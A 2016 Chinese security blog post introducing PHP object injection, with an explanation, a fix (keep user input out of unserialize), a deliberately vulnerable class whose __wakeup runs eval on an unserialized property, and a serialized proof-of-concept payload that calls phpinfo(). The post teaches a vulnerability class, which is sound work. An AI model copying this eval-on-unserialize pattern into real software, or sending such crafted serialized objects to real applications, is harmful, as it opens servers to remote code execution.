<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> php对象注入漏洞简介 · xd_xd's blog</title><meta name="description" content="php对象注入漏洞简介 - xd_xd"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.ico"><link rel="stylesheet" href="/css/apollo.css"><script src="/js/jquery-3.1.0.min.js"></script><script src="/js/jquery.goup.js"></script><script src="/js/goup.js"></script><link rel="search" type="application/opensearchdescription+xml" href="http://xdxd.love/atom.xml" title="xd_xd's blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/logo.jpg"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="https://github.com/hkalexling" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/archives" target="_self" class="nav-list-link">ARCHIVES</a></li><li class="nav-list-item"><a href="/friends" target="_self" class="nav-list-link">FRIENDS</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">php对象注入漏洞简介</h1><div class="post-info">Mar 8, 2016</div><div class="post-content"><h1 id="漏洞原理">漏洞原理</h1><p>理解php对象注入,需要了解基本的php面向对象编程的概念和php中的魔术方法。可以参考<a href="http://drops.wooyun.org/papers/4820" target="_blank" rel="external">理解php对象注入</a>,文中练习代码可以在<a href="https://github.com/stayliv3/blog_material/tree/master/objecti" target="_blank" rel="external">这里下载</a></p>
<p>用户可控的数据进入了unserialize函数进行对象重建，通常通过(但不限于)魔术方法进行利用</p>
<h1 id="利用方式">利用方式</h1><p>通常利用<strong>wakeup或</strong>destruct魔幻方法有关，但还有很多其他常见注入点。</p>
<h1 id="修复方案">修复方案</h1><p>避免用户可控的输入进入unserialize函数</p>
<h1 id="漏洞代码">漏洞代码</h1><pre><code>&lt;?php
class RunCode
{
   public <span class="variable">$code</span>;
   function __construct()
   {

   }
   function __wakeup()
   {
        if(isset(<span class="variable">$this-</span>&gt;code))
        {
            eval(<span class="variable">$this-</span>&gt;code);
        }
   }
}
<span class="keyword">if</span>(isset($_REQUEST[<span class="string">'array'</span>]))
{   
 <span class="variable">$var1</span>=unserialize($_REQUEST[<span class="string">'array'</span>]);
if(is_array(<span class="variable">$var1</span>))
{
echo <span class="string">"&lt;br/&gt;First Element: "</span>.<span class="variable">$var1</span>[<span class="number">0</span>];
}
}
<span class="keyword">else</span>
{
echo <span class="string">"Array parameter is missing"</span>;
}
 ?&gt;
</code></pre><p>unserialize对象的时候，会执行<strong>wakeup方法。而</strong>wakeup方法存在危险的eval函数。</p>
<p>对应的序列化数据的代码：</p>
<pre><code>class RunCode
{
    // 类数据

    public <span class="variable">$age</span> = <span class="number">0</span>;
    public <span class="variable">$code</span> = <span class="string">''</span>;

    // 输出数据

    public function PrintData()
    {
        echo <span class="string">'User '</span> . <span class="variable">$this-</span>&gt;code . <span class="string">' is '</span> . <span class="variable">$this-</span>&gt;age
             . <span class="string">' years old. &lt;br /&gt;'</span>;
    }
}

// 创建一个对象

<span class="variable">$usr</span> = new RunCode();

// 设置数据

<span class="variable">$usr-</span>&gt;code = <span class="string">'phpinfo();'</span>;
// <span class="variable">$usr-</span>&gt;name = <span class="string">'John'</span>;

// 输出数据

<span class="variable">$usr-</span>&gt;PrintData();

// 输出序列化之后的数据

echo serialize(<span class="variable">$usr</span>);
</code></pre><p>生成的序列化数据为：<code>O:7:&quot;RunCode&quot;:2:{s:3:&quot;age&quot;;i:0;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;}</code></p>
<p><img src="/images/phpobjectinjection1.png" alt=""></p>
</div></article></div></section><footer><div class="paginator"><a href="/2016/03/09/使用转义防御XSS/" class="prev">上一篇</a><a href="/2016/03/07/order-by注入点利用方式/" class="next">下一篇</a></div><div class="copyright"><p>© 2015 - 2016 <a href="http://xdxd.love">xd_xd</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/hkalexling/Yuno-Apollo" target="_blank">Yuno-Apollo</a>.</p></div></footer></div><script src="https://cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>